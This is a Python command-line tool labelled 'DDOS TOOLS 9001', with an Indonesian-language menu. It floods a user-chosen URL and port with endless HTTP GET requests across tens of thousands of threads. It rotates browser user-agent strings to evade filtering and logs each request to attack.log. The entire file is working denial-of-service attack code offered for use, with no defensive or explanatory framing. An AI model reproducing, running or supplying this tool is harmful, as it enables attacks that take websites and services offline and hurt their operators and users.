import requests
import threading
import random
import logging
import signal
import sys
import re
import itertools
import time
from concurrent.futures import ThreadPoolExecutor
from os import system

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12"
]

def signal_handler(sig, frame):
    print('\n\033[35mStopping attack...\033[1;37m')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def is_valid_host(host):
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, host) is not None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
file_handler = logging.FileHandler("attack.log")
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
logging.getLogger().addHandler(file_handler)

def send_request(target_url, port):
    headers = {
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "User-Agent": random.choice(user_agents)
    }
    full_url = f"{target_url}:{port}"
    while True:
        try:
            response = requests.get(full_url, headers=headers)
            logging.info(f"\033[1;36mSent request to {full_url}, Status Code: \033[1;31m{response.status_code}\033[1;37m")
        except requests.exceptions.RequestException as e:
            logging.error(f"\033[1;31mRequest failed: {e}\033[1;37m")

def loading_animation():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if not threading.main_thread().is_alive():
            break
        sys.stdout.write('\r\033[1;32mAttacking\033[1;37m ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

def start_attack(target_url, port, threads):
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_request, target_url, port) for _ in range(threads)]
        for future in futures:
            try:
                future.result()
            except Exception as e:
                logging.error(f"\033[1;31mThread raised an exception: {e}\033[1;37m")

def main_menu():
    target_url = None
    port = 8080
    threads = 40000

    while True:
        system('clear')
        print('\033[1;36m')
        system('figlet DDOS 9001')
        print("\033[1;31mDDOS TOOLS 9001 By:bryann")
        print("\033[1;31m1. \033[1;36mMulai Menyerang")
        print("\033[1;31m2. \033[2;36mAtur URL target")
        print("\033[1;31m3. \033[1;36mAtur Port")
        print("\033[1;31m4. \033[1;36mAtur Nomor Thread")
        print("\033[1;31m5. \033[1;36mKeluar")
        choice = input("\033[1;36mMasukkan Pilihan: \033[1;37m")
        if choice == '1':
            if not target_url:
                print("\033[1;31mTarget URL belum di masukkan. Tolong masukkan terlebih dahulu")
            else:
                print(f"\033[1;32mStarting attack on \033[1;36m{target_url}:\033[1;32m{port} \033[1;37mwith \033[1;32m{threads} \033[1;37mthreads...")
                start_attack(target_url, port, threads)
        elif choice == '2':
            new_url = input("\033[1;36mMasukkan URL Target: \033[1;37m")
            if is_valid_host(new_url):
                target_url = new_url
                print(f"\033[1;36mTarget URL set to {target_url}")
            else:
                print("\033[1;31mURL Salah....")
        elif choice == '3':
            try:
                new_port = int(input("\033[1;36mMasukkan Port: \033[1;37m"))
                if 1 <= new_port <= 65535:
                    port = new_port
                    print(f"\033[1;36mPort set to \033[1;37m{port}")
                else:
                    print("\033[1;36mPort number \033[1;37m65535.")
            except ValueError:
                print("\033[1;31mYang Anda Masukkan Salah...")
        elif choice == '4':
            try:
                new_threads = int(input("\033[1;36mMasukkan Nomor Threads: \033[1;37m"))
                if new_threads > 0:
                    threads = new_threads
                    print(f"\033[1;32mNumber of threads set to {threads}")
                else:
                    print("\033[1;32mThread Minimal 9900")
            except ValueError:
                print("\033[1;31mNomor Salah....")
        elif choice == '5':
            print("\033[1;31mKeluar...")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
